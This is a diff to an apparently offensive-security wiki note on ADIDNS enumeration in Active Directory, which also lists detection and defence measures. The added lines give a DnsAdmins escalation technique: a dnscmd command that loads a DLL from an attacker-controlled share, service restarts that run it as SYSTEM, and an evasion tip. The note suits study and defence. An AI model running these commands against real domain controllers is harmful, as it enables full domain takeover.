@@ -32,6 +32,8 @@ Get-DnsServerResourceRecord -ComputerName dc01 -ZoneName corp.local |
 
 Output typically reveals: print servers, internal web apps, SCCM/MECM endpoints, backup boxes, jump hosts, dev domains — high-value targets that don't appear in external recon. ADIDNS records can also be *written* by authenticated users (the dnsNode default DACL grants Create Child), which is the primary write primitive behind mitm6/WPAD-style attacks.
 
+If enumeration turns up a member of the `DnsAdmins` group you also gain a code-execution path on the DNS server itself: `dnscmd <dc> /config /serverlevelplugindll \\attacker\share\evil.dll` registers an arbitrary DLL under `HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll`, and `sc.exe \\<dc> stop dns && sc.exe \\<dc> start dns` loads it as SYSTEM. The DLL must spawn its payload in a new thread or the DNS service will fault and roll back — defenders frequently miss this primitive because it bypasses the LSASS-centric tripwires.
+
 ## Detection and defence
 - Detect bulk LDAP searches against `CN=MicrosoftDNS` with `objectClass=dnsNode` — rare for legitimate clients
 - Set zone-level permission `DNS UPDATE PROXY` group restrictions and remove Create Child from Authenticated Users on zones that don't need dynamic updates
@@ -42,4 +44,5 @@ Output typically reveals: print servers, internal web apps, SCCM/MECM endpoints,
 - [adidnsdump](https://github.com/dirkjanm/adidnsdump) — reference tool and protocol notes
 - [Dirk-jan — Exploiting and detecting ADIDNS](https://dirkjanm.io/exploiting-the-adidns-protocol-in-active-directory-attacks/) — write side and defence
 - [HackTricks — ADIDNS poisoning](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/dns.html) — companion reading
+- [ired.team — DnsAdmins to SYSTEM](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise) — `ServerLevelPluginDll` DLL-load follow-on
 - See also: [[ldap-enumeration]], [[bloodhound]]
